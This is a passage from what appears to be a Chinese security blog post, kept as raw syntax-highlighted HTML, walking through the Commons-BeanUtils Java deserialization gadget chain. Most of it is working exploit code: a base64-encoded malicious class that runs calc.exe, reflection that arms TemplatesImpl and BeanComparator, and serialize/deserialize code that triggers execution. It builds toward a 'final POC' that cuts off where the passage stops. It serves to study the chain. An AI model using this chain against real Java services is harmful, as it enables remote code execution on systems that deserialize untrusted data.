function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaBeanTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaBean</span>(), <span class="hljs-string">&quot;name&quot;</span>);<br>        System.out.println(name);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051440903.png" alt="QQ截图20220305144036"></p><h2 id="BeanComparator-compare"><a href="#BeanComparator-compare" class="headerlink" title="BeanComparator#compare"></a>BeanComparator#compare</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051446886.png" alt="QQ截图20220305144522"></p><p>该类继承了<strong>Comparator</strong>。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051446211.png" alt="QQ截图20220305144607"></p><p>如果property为空则比较传入的参数，否则进入try，然后调用一个JavaBean的getter方法。这时候就想到了。之前利用的TemplatesImpl加载恶意类中的getOutputProperties，刚好满足getter的定义。<br>我们可以具体来看一下代码。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051456435.png" alt="QQ截图20220305145619"></p><p>那么也就说我们如果构造**PropertyUtils.getProperty( new TemplatesImpl(), OutputProperties )**就可以成功加载恶意类。<br>先不添加反序列化和序列化。来安排一个。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CbTestOne</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, NoSuchFieldException, IOException &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//</span><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,beanComparator);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>        PropertyUtils.getProperty(templates,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可成功弹出计算器。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051727342.png" alt="QQ截图20220305172653"></p><h2 id="添加上序列化"><a href="#添加上序列化" class="headerlink" title="添加上序列化"></a>添加上序列化</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CbTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, NoSuchFieldException, IOException &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//</span><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,beanComparator);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>        PropertyUtils.getProperty(templates,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> aClass1.getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-literal">true</span>);<br>        comparator.set(priorityQueue,templates);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass2</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.commons.beanutils.BeanComparator&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">property</span> <span class="hljs-operator">=</span> aClass2.getDeclaredField(<span class="hljs-string">&quot;property&quot;</span>);<br>        property.setAccessible(<span class="hljs-literal">true</span>);<br>        property.set(beanComparator,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="注意点1"><a href="#注意点1" class="headerlink" title="注意点1"></a>注意点1</h2><p>这里相比与cc2来说，p神这里添加上了<strong>PriorityQueue priorityQueue &#x3D; new PriorityQueue(2,beanComparator);<strong>本人直接按照cc2的理解去走,后面跟进去看了看。才发现。当代码跟进到。</strong>PriorityQueue#siftUpUsingComparator</strong>这时候恍然大悟，我人都傻了，继续跟进他会直接跳转到<strong>BeanComparator#compare</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051819928.png" alt="QQ截图20220305173004"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051819921.png" alt="QQ截图20220305173013"></p><p>但是我们要成功弹出计算器，就必须是的<strong>property</strong>不为空，可以通过反射破局。<code>property=outputProperties</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">aClass2</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.commons.beanutils.BeanComparator&quot;</span>);<br><span class="hljs-type">Field</span> <span class="hljs-variable">property</span> <span class="hljs-operator">=</span> aClass2.getDeclaredField(<span class="hljs-string">&quot;property&quot;</span>);<br>property.setAccessible(<span class="hljs-literal">true</span>);<br>property.set(beanComparator,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="注意点2"><a href="#注意点2" class="headerlink" title="注意点2"></a>注意点2</h2><p>上面的添加上反序列化仍然会报错的。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051818642.png" alt="image-20220305173956699"></p><p>所以p神才会构造成，<code>new Object[]&#123;templates,templates&#125;</code>，将这两个的值传入了<code>o1</code>和<code>o2</code></p><h2 id="最终POC"><a href="#最终POC" class="headerlink" title="最终POC"></a>最终POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span 